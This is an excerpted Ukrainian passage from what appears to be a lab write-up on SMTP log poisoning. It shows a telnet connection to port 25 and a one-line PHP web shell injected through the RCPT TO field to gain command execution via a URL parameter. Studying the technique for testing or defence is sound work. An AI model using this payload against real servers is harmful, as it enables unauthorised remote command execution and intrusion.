...
3. **Інжекція Коду:** Поштовий сервіс (SMTP) повинен логувати несанітизований ввід від клієнта (наприклад, у полі RCPT TO), дозволяючи запис шкідливого PHP-коду у лог-файл.1
...
Для успішного відтворення цього вектора атаки необхідно забезпечити наявність специфічних умов на цільовій системі та підготувати відповідний набір інструментів.1
...
### **3.2. Механізм Логування та Інжекція PHP**
...
* **2\. Інжекція Коду:** Після привітання SMTP-сервера необхідно ввести послідовність команд, використовуючи поле RCPT TO: для розміщення шкідливого пейлоаду. Використовується PHP-код, що дозволяє виконання команд ОС через URL-параметр c.1
...
| RCPT TO:\<?php system($\_GET\['c'\]);?\> | **Інжекція шкідливого коду** | Помилка синтаксису (501) | Запис *інжектованого рядка* |
...
| 3\. Інжекція PHP | telnet 192.168.1.107 25 / RCPT TO:\<?php system($\_GET\['c'\]);?\> | Отруєння лог-файлу | 1 |
